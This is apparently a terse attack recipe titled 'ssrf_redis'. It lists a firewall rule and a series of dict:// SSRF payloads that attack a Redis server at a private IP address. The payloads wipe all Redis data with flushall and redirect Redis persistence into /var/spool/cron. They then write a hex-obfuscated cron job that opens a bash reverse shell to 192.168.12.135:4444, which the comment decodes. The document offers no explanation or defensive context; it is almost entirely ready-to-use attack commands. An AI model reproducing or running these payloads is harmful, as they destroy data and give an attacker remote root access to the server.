

ssrf_redis





```shell
firewall-cmd --permanent --add-rich-rule="rule family="ipv4" source address="192.168.12.129" port protocol="tcp" port="6379" accept"
```



```shell
url=dict://192.168.12.131:6379/flushall

url=dict://192.168.12.131:6379/config:set:dir:/var/spool/cron

url=dict://192.168.12.131:6379/config:set:dbfilename:root

# set a * * * * * bash -i >& /dev/tcp/192.168.12.135/4444 0>&1
url=dict://192.168.12.131:6379/set:a:"\n\n\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x2A\x20\x62\x61\x73\x68\x20\x2D\x69\x20\x3E\x26\x20\x2F\x64\x65\x76\x2F\x74\x63\x70\x2F\x31\x39\x32\x2E\x31\x36\x38\x2E\x31\x32\x2E\x31\x33\x35\x2F\x34\x34\x34\x34\x20\x30\x3E\x26\x31\n\n"

url=dict://192.168.12.131:6379/save
```



